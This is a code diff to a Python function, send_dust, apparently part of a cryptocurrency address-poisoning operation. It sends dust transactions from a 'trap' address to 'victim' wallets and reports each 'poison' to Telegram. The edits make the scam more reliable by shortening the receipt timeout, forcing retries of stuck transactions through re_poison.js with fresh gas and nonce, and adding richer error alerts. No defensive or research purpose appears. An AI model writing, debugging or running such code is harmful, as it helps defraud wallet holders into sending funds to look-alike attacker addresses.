@@ -523,9 +523,9 @@ def send_dust(private_key, victim_address, campaign_id=None):
         logger.info(f"TX hash: {tx_hash.hex()}")
 
         try:
-            # Wait up to 120 seconds for the receipt. 
-            # This is safely under the 180s Node.js timeout, preventing premature kills.
-            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+            # Wait up to 90 seconds for the receipt.
+            # This is safely under the 150s Node.js timeout, preventing premature kills.
+            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=90)
             
             if receipt.status == 1:
                 try:
@@ -534,29 +534,26 @@ def send_dust(private_key, victim_address, campaign_id=None):
                     decimals = 6
                 
                 success_msg = f"✅ Poison sent successfully!\nVictim: {victim}\nTrap: {trap}\nAmount: {dust / 10**decimals:.6f} {asset}\nTX: {tx_hash.hex()}"
-                
                 if info_msg:
                     success_msg += f"\n\n{info_msg}"
-                    
                 send_telegram(success_msg, campaign_id=campaign_id)
                 return True
             else:
-                # Explicitly caught a revert. Returns False so re_poison.js can retry.
                 logger.error("Transaction reverted on-chain.")
-                send_telegram(f"❌ Poison transaction reverted\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+                send_telegram(f"❌ Poison transaction reverted on-chain.\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
                 return False
                 
         except TimeExhausted:
-            # Transaction is still pending. We return True to STOP re_poison.js from retrying.
-            # Retrying a pending transaction with the same nonce is what causes the [CANCELLED] status.
-            logger.warning(f"Transaction {tx_hash.hex()} is still pending after 120s. Avoiding duplicate retry.")
-            send_telegram(f"⏳ Poison transaction is pending (taking longer than usual).\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
-            return True 
+            # Return False so re_poison.js will retry. 
+            # The retry will fetch a fresh gas price and nonce, replacing the stuck pending tx.
+            logger.warning(f"Transaction {tx_hash.hex()} is pending. Triggering retry with updated gas.")
+            send_telegram(f"⏳ Poison transaction pending. Retrying with updated gas...\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+            return False 
             
         except Exception as e:
-            # Catches any other exact RPC or broadcasting errors
-            logger.error(f"Error waiting for receipt: {e}")
-            send_telegram(f"❌ Poison failed\nVictim: {victim_address}\nExact Error: {e}", campaign_id=campaign_id)
+            # Logs the exact error in the notification as requested
+            logger.error(f"Exact error waiting for receipt: {e}")
+            send_telegram(f"❌ Poison failed with exact error: {e}\nVictim: {victim_address}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
             return False
             
     except Exception as e:
